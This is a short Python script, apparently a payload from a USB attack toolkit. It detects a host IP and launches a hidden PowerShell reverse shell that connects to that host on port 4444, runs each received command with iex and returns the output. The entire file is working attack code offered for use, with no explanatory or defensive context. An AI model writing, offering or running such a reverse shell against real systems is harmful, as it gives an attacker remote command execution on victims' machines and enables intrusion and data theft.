# File: payloads/revshell/run.py
import subprocess
import socket

# Try dynamic USB IP detection
def get_usb_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        return s.getsockname()[0]
    except Exception:
        return "10.13.37.1"

host_ip = get_usb_host_ip()

print(f"[*] Launching in-memory reverse shell to {host_ip}")
payload = f'''
powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
"$client = New-Object System.Net.Sockets.TCPClient('{host_ip}',4444); 
$stream = $client.GetStream(); 
[byte[]]$bytes = 0..65535|%{{0}}; 
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
$sendback = (iex $data 2>&1 | Out-String ); 
$sendback2  = $sendback + 'PS ' + (pwd).Path + '> '; 
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
$stream.Write($sendbyte,0,$sendbyte.Length); 
$stream.Flush()}}"
'''

subprocess.run(["powershell", "-Command", payload], shell=True)
